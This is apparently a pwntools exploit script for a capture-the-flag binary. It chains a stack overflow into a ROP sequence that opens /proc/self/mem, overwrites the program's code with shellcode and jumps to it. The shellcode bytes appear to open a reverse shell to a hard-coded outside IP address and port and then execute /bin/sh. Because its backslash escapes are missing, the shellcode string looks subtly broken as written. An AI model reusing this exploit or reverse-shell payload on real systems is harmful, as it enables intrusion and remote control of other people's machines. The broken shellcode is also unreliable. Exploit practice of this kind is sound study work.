from pwn import *
from LibcSearcher import *
context.binary = './load'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc

if args['REMOTE']:
	p = remote('127.0.0.1', 10005)
	#libc = ELF('../x64_libc.so.6')
else:
	p = process('./load')
	gdb.attach(p, 'b* 0x4008A2')

filename_addr = 0x601040




pop_rdi = 0x400a73
pop_rsi_r15 = 0x400a71

pops_ret = 0x400A6A			#in init genaral pop chain
movs_call = 0x400A50 		

open_plt = elf.plt['open']
puts_plt = elf.plt['puts']
lseek_got = elf.got['lseek']

write_mem = 0x400816

fd_name = '/proc/self/fd/0'
mem_name = '/proc/self/mem'

shellcode = "x68x76xbex45x25x66x68xd4xacx66x6ax02x6ax2ax6ax10x6ax29x6ax01x6ax02x5fx5ex48x31xd2x58x0fx05x48x89xc7x5ax58x48x89xe6x0fx05x48x31xf6xb0x21x0fx05x48xffxc6x48x83xfex02x7exf3x48x31xc0x48xbfx2fx2fx62x69x6ex2fx73x68x48x31xf6x56x57x48x89xe7x48x31xd2xb0x3bx0fx05x00"

payload = fd_name + '\x00'					#just stdin
payload += mem_name + '\x00'				#process memory	
pos_shellcode = len(payload)

payload += shellcode
payload +='1\x00'
pos_rop = len(payload)

p.sendline(payload)
p.recvuntil('file name: ')
p.sendline('0')

#stack overflow
payload = 'a' * 0x30 + p64(filename_addr + pos_rop)#fake_rbp
payload += p64(pop_rdi)
payload += p64(filename_addr + len(fd_name) + 1)	#rdi => "/proc/self/mem"
payload += p64(pop_rsi_r15)
payload += p64(0) + p64(0)							#rsi = 0  r15 = 0 
payload += p64(open_plt)							#fd = open("/proc/self/mem", 0) = 0

payload += p64(pop_rdi)
payload += p64(filename_addr + len(fd_name) + 1)	#rdi => "/proc/self/mem"
payload += p64(pop_rsi_r15)
payload += p64(2) + p64(0)							#rsi = 2  r15 = 0 
payload += p64(open_plt)							#fd = open("/proc/self/mem", 2) = 1

payload += p64(pops_ret)
payload += p64(0)									#rbx = 0
payload += p64(1)									#rbp = 1
payload += p64(lseek_got)							#r12 call[r12 + rbp*8]
payload += p64(0)									#r13, mov rdx, r13
payload += p64(write_mem)							#r14, mov rsi, r14
payload += p64(1)									#r15, mov edi, r15
payload += p64(movs_call)							#
payload += p64(0)									#padding
payload += (p64(0)*6)								#registers

payload += p64(pop_rdi)
payload += p64(filename_addr + pos_shellcode)

payload += p64(puts_plt)							#puts(shellcode) fd = stdout =1 = file* /proc/self/mem
payload += p64(write_mem)							#ret 2 shellcode(which has been writen to text)

p.recvuntil('size: ')
p.sendline(str(len(payload)))
p.send(payload)


p.interactive()
p.close()	



